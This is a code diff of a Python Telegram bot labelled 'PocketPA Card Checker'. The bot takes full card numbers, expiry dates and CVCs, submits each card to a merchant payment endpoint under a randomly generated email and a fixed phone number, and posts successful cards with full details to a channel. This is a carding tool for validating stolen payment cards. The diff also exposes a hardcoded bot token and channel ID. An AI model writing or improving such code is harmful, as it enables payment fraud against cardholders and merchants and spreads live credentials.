@@ -2,42 +2,45 @@ import telebot
 import requests
 import random
 import string
-import re
 import urllib.parse
 
 POCKETPA_BOT_TOKEN = "7194711538:AAHr734HrJWS7fub791CMhyJpDlDCcrF2ww"
 CHANNEL_ID = -1002170961342
 bot = telebot.TeleBot(POCKETPA_BOT_TOKEN)
 
-def extract_card_details(text):
-    card = re.search(r'\d{13,19}', text.replace(" ", ""))
-    cvc = re.search(r'(\d{3,4})(?!.*\d)', text)
-    exp = re.search(r'(\d{1,2})[\/|\-| ](\d{2,4})', text)
-    return {
-        "card_number": card.group() if card else None,
-        "exp_month": exp.group(1) if exp else None,
-        "exp_year": exp.group(2) if exp else None,
-        "cvc": cvc.group(1) if cvc else None
-    }
-
 def generate_random_email():
     name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
     return f"{name}@gmail.com"
+
+def parse_card_input(text):
+    parts = text.strip().split('|')
+    if len(parts) != 4:
+        return None
+    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
+    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
+        return None
+    return card_number, exp_month.zfill(2), exp_year, cvc
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(message.chat.id,
         "💳 PocketPA Card Checker\n"
-        "Send card in any format (spaces, slashes, pipes, etc)."
+        "Send card in this format:\n"
+        "CardNumber|MM|YY|CVC\n"
+        "CardNumber|MM|YYYY|CVC\n"
+        "Example:\n4242424242424242|05|25|123"
     )
 
 @bot.message_handler(func=lambda m: True)
 def card_handler(message):
     try:
-        details = extract_card_details(message.text)
-        if not all(details.values()):
-            bot.reply_to(message, "❌ Could not extract all card details. Please try again.")
-            return
+        parsed = parse_card_input(message.text)
+        if not parsed:
+            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")
+
+        card_number, exp_month, exp_year, cvc = parsed
+        if len(exp_year) == 2:
+            exp_year = "20" + exp_year
 
         email = generate_random_email()
         phone = "+13144740467"
@@ -68,10 +71,10 @@ def card_handler(message):
                 "zip_code": zip_code,
                 "is_affiliate": False,
                 "card": {
-                    "number": details["card_number"],
-                    "exp_month": details["exp_month"].zfill(2),
-                    "exp_year": details["exp_year"][-2:] if len(details["exp_year"]) > 2 else details["exp_year"],
-                    "cvc": details["cvc"]
+                    "number": card_number,
+                    "exp_month": exp_month,
+                    "exp_year": exp_year[-2:],
+                    "cvc": cvc
                 }
             }
 
@@ -92,7 +95,7 @@ def card_handler(message):
             if resp_json.get("status") == "success" or response.status_code == 201:
                 success_msg = (
                     f"✅ PocketPA Payment Successful!\n"
-                    f"Card: {details['card_number']} | {details['exp_month']}/{details['exp_year']} | {details['cvc']}\n"
+                    f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
                     f"Email: {email}\n"
                     f"Full Response:\n{resp_json}"
                 )
